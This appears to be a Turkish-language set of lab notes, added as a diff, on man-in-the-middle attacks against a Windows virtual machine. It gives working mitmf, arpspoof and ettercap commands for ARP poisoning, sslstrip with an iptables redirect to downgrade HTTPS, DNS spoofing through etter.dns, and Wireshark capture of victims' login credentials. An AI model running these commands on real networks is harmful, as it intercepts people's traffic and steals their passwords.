@@ -1,0 +1,180 @@
+	POST-CONNECTION ATTACKS
+
+ Başlamadan önce Kali Linux'u Bridged Adaptor,
+ Windows sanal makinede Nat Network ağına aldık.
+
+ Bu aşama için bir önceki bölümde cihaz ile aynı ağa bağlanıp,
+ şifresine eriştiğimiz için windows sanal makinemizi kullanacağız.
+
+
+
+
+	MAN IN THE MITTLE
+  MITM (ortadaki adam)
+ Hedefin ve Modemin ortasında olmak.
+ Bilgi transferi Hacker üzerinden geçerse tüm bilgileri rahatlıkla görebilir ve inceleyebiliriz.
+
+ HEDEF CİHAZ -> request -> HACKER -> request -> ROUTER   -> response -> HACKER -> response -> HEDEF CİHAZ
+ WIN 10 vb.  -> istek   -> KORSAN -> istek   -> INTERNET -> cevap    -> KORSAN -> cevap    -> WIN 10 vb.
+
+
+echo 1 > /proc/sys/net/ipv4/ip_forward		-> Yukarıdaki işlemleri gerçekleştirebilmek için forward'ı etkin hale getirdik.
+mitmf --arp --spoof --gateway 172.20.10.1 --target 172.20.10.7 wlan0mon		-> Modem MAC adresini Kalimizin MAC adresi ile değiştirdik.
+										-> Saldırımız başladı.
+
+
+ Saldırılan cihazda arp -a çalıştırarak başarılı olup olmadığını görebiliriz.
+ Eğer başarılı oldu ise Modemin MAC Adresi ile Kali'mizin MAC Adresi aynı olacaktır.
+ MITM açıkken hedef bilgisayarda internet üzerinden yapılan her veri akışı hacker'a gönderilir. (username, password vs.)
+
+
+ Herhangi bir sorunla karşılaşsaydık -> Manuel olarak ARP Spoofing yapacağız:
+ 1.Terminal:
+arpspoof -i wlan0 -t 172.20.10.7 172.20.10.1	-> Çalıştır.
+
+ 2.Terminal:
+arpspoof -i wlan0 -t 172.20.10.1 172.20.10.7	-> Çalıştır, arp spoofing başladı.
+
+ Saldırılan cihazda arp -a çalıştırarak başarılı olup olmadığını görebiliriz.
+ unicornitems.com'a kullanıcı adı ve şifre gir ve veri akışı geliyor mu kontrol et.
+
+ Veriler gelmiyorsa 2 Terminalden arp spoofing yapıp,
+ 3. Terminalde MITMF çalıştırmayı deneyebiliriz.
+
+
+
+
+	ETTERCAP
+  Ettercap Settings
+leafpad /etc/ettercap/etter.conf
+
+ -----
+ Linux	-> İçerisinde iptables yorum satırlarını kaldırıyoruz.
+ -----
+
+ Güçlü bir modeme karşı saldırı yapacaksak modeme yakalanmamak
+ için "delay" miktarlarını arttırmayı deneyebiliriz.
+
+  [privs]
+ ec_uid = 0
+ ec_gid = 0
+ -> Değerleri 0 yaptık.
+
+
+
+
+	ETTERCAP ÇALIŞTIRMAK
+ Herhangi bir hedef belirtmeden yalnızca ettercap çalıştırmak istiyorsak /// koyabiliriz.
+ T = Textmode	q = Quality
+ ettercap çalıştığında "l" tuşuna basarsak karşımıza bir Hostlist çıkaracaktır. (netdiscover da bir alternatif)
+ "q" ile ettercap aracından çıkış yapabiliriz.
+
+
+ettercap -Tq -M arp:remote -i wlan0 /172.20.10.1// /172.20.10.7//
+ Hedef belirtmediğimiz için wlan0'da ne varsa her şeyi hedefleyecektir.
+
+	____________________________________________
+
+	Bilgi Notu: /// ne anlama gelmektedir?
+	-> mac_adress///	Saldırı Yapacağımız
+	-> /ipv4//		seçeneği girmek için
+	-> //ipv6/		  kullanılıyor.
+	____________________________________________
+
+
+ Saldırılan cihazda arp -a çalıştırarak başarılı olup olmadığını görebiliriz.
+ Eğer başarılı oldu ise Modemin MAC Adresi ile Kali'mizin MAC Adresi aynı olacaktır.
+ ETTERCAP açıkken hedef bilgisayarda internet üzerinden yapılan her veri akışı hacker'a gönderilir. (username, password vs.)
+
+ Ettercap, veri akışının içinden Kullanıcı bilgilerini aramamıza gerek kalmadan
+ direkt olarak Kullanıcı adı ve Şifreyi bize sunacaktır.
+
+ Hedef tarafından girilen sitelere vs. bakacaksak daha detaylı bir veri akışı sunan MITF aracını kullanabiliriz.
+
+
+
+
+	ATTACKING MULTIPLE DEVICES
+ettercap -Tq -M arp:remote -i wlan0 /172.20.10.1// /172.20.10.7-20//
+	172.20.10.7-20//	> 7'den, 20'ye kadar ip poisoning yapar.
+
+ Eğer 2 tane hedefimiz varsa ve hangisinin saldırmak istediğimiz cihaz olduğun
+ anlayamıyorsak 2'sine de "," kullanarak saldırabiliriz.
+
+ettercap -Tq -M arp:remote -i wlan0 /172.20.10.1// /172.20.10.7, 172.20.10.1//
+
+
+
+
+	HTTPS Websites
+ Bunun için sslstrip toolunu kullanacağız.
+ Bu araç bir Proxy'ye veya bir Port'a ihtiyacımız var.
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+sslstrip
+ettercap -Tq -M arp:remote -S -i wlan0 /172.20.10.1// /172.20.10.7//
+	-S = Kendi imzaladığımız bir SSL Sertifikası
+	     Her sslstrip kullandığımızda "-S" çalıştırmamız gerekiyor.
+	     "Kendin bir ssl sertifikası yaratma, bunu kullanma."
+
+
+ Çalıştırdığımız anda saldırımız başlamış olacaktır. HTTPS, HTTP'ye Downgrade edildi!
+
+ Saldırılan cihazda arp -a çalıştırarak başarılı olup olmadığını görebiliriz.
+ Eğer başarılı oldu ise Modemin MAC Adresi ile Kali'mizin MAC Adresi aynı olacaktır.
+ ETTERCAP açıkken hedef bilgisayarda internet üzerinden yapılan her veri akışı hacker'a gönderilir. (username, password vs.)
+
+ Ettercap, veri akışının içinden Kullanıcı bilgilerini aramamıza gerek kalmadan
+ direkt olarak Kullanıcı adı ve Şifreyi bize sunacaktır.
+
+ Araç ile işimiz bittiğinde başka bir rooting işlemi yaptığımızda 
+ çakışmalara sebep olmaması içiniptables'ı flush etmemiz gerekmektedir.
+	-> iptables -t nat --flush <-
+
+
+
+
+	ETTERCAP TOOLS
+ Öncelikle işleme başlamadan önce hem Windows'u hem Kali'yi de Nat Ağına alacağız.
+ Böylelikle 2'si de aynı ağ üzerinde olacak ve birbirini görebiliyor olacaktır.
+
+ettercap -Tq -M arp:remote -S -i eth0 /10.0.2.4// /10.0.2.1//	-> Saldırı başladı.
+
+ Windowsta "arp -a" çalıştırırsak MAC Adreslerin aynı olduğunu görebiliriz yani saldırı çalışıyor.
+
+ ettercap çalıştırdığımız terminalde "p" tuşuna basarsak ettercap bize kullanacabileceğimiz araçları göstecektir.
+ arp_cop	aracı size bir arp saldırı olacaksa bunu kullanabilirsiniz, arp polisi anlamına gelmektedir ve saldırıların raporunu verir.
+ autoadd	aracı bir modeme saldırı yapıyorsak o modeme kim bağlanırsa bağlansın o cihaza da saldırı yapacaktır.
+ chk_poison	aracı arp zehirleme saldırısının başarılı olup olmadığına bakar.
+ dns_spoof	aracı DNS Spoofing işlemini gösterir.
+ dos_attack	aracı Hedefi servisten mahrum bırakmayı sağlar. (internetini kesmek vs.)
+ Direkt olarak Plugin adını yazarak ettercap araçlarını çalıştırabiliriz.
+
+
+
+
+	SITE DIRECT
+leafpad /etc/ettercap/etter.dns	-> Yönlendirme yapmak için birkaç değişiklik yaptık.
+				   unicornitems.com A 10.0.2.15 gibi
+				   unicornitems.com'a girenleri 10.0.2.15'e yönlendir.
+
+ettercap -Tq -M arp:remote -S -i eth0 /10.0.2.4// /10.0.2.1//	-> -P kullanarak kullanacağımız plugin'i seçebiliriz.
+
+ Kullanıcı bu aşamadan itibaren unicornitems.com adresine girdiğinde apache2 server'ına yönlendirilecektir.
+ Eğer apache server'ı çalışır durumda değilse "service apache2 start" komutu çalıştırabiliriz.
+
+
+
+
+	Üstteki Alternatifler Başarısız olursa:
+ettercap -Tq -M arp:remote -i eth0 /10.0.2.4// /10.0.2.1//	-> Saldırı devam ederken yeni bir pencerede wireshark açacağız.
+wireshark
+
+ Hedef bilgisayar herhangi bir siteye kullanıcı bilgilerini giriş yaptığında 
+ bilgiler yakalanmayabilir. One way spoofing yaparken böyle bir ihtimal söz konusu.
+
+ Wireshark yakalayabilmiş mi onu kontrol edecek olursak "http" paketlerini filtreleyeceğiz.
+ ve POST metodu kullanan verileri inceleyeceğiz.
+
+ Wireshark içerisinde araştırma yaptığımızda işlemin başarılı olduğunu göreceğiz.
+ Kurban'ın Kullanıcı bilgilerini ele geçirmeyi başarıyla tamamlandı.
